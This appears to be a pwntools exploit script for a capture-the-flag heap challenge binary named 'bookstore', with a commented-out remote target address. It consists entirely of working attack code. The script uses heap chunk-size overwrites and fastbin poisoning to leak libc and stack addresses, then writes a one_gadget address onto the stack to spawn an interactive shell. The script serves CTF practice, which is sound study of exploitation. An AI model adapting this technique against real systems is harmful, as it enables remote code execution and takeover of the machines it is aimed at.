from pwn import *
def cmd(c):
	p.sendlineafter("choice:\n",str(c))
def add(size,name,author=p64(0x61)*3+'\x61'+'\n'):
	cmd(1)
	p.sendafter("name?\n",(author))
	p.sendlineafter("name?\n",str(size))
	p.sendlineafter("book?\n",(name))
def free(idx):
	cmd(2)
	p.sendlineafter("sell?\n",str(idx))
def read(idx):
	cmd(3)
	p.sendlineafter("sell?\n",str(idx))
p=process("./bookstore")
#p=remote("202.0.1.70",40003)
context.log_level='debug'
add(0x18,p64(0xdeadbeef))#0
add(0x48,p64(0xcafebabe))#1
add(0x48,p64(0x21)*9)#2
add(0x48,p64(0x21)*9)#3
free(0)
add(0,(p64(0)*3+p64(0x91)))#0
free(1)
add(0x48,'')
read(1)
p.readuntil("name:")
base=u64(p.readline()[:-1].ljust(8,'\x00'))-(0x7ffff7dd1bf8-0x00007ffff7a0d000)
log.warning(hex(base))
# leak libc over 
add(0x38,p64(0xdeadbeef))#4
add(0x18,'\n')#5
add(0x4f,'\n')#6
add(0x48,p64(0x12)*9)#7
add(0x48,p64(0x12)*9)#8
free(5)
add(0,p64(0)*3+p64(0x61))#5
free(6)
free(5)

binary=ELF("./bookstore")
libc=binary.libc
libc.address=base

add(0,p64(0)*3+p64(0x61)+p64(0x602060-8))#5
add(0x4f,'\n')#6
add(0x4f,p64(0xdeadbeef)*3+p64(libc.symbols['environ']))#9
read(0)
p.readuntil("name:")
stack=u64(p.readline()[:-1].ljust(8,'\x00'))
log.warning(hex(stack))
aim=stack+(0x7fffffffde5a-0x7fffffffdf68-8)
# leak stack over 
add(0x18,'\n')#10
add(0x38,'\n')#11
free(10)
free(11)
add(0,p64(0xdeadbeef)*3+p64(0x41)+p64(aim))
add(0x38,'\n')

#gdb.attach(p)
one=0x45216+base
add(0x38,"\x00"*6+p64(0)+p64(0x400c70)+p64(one))
# control stack
cmd(4)
p.interactive()
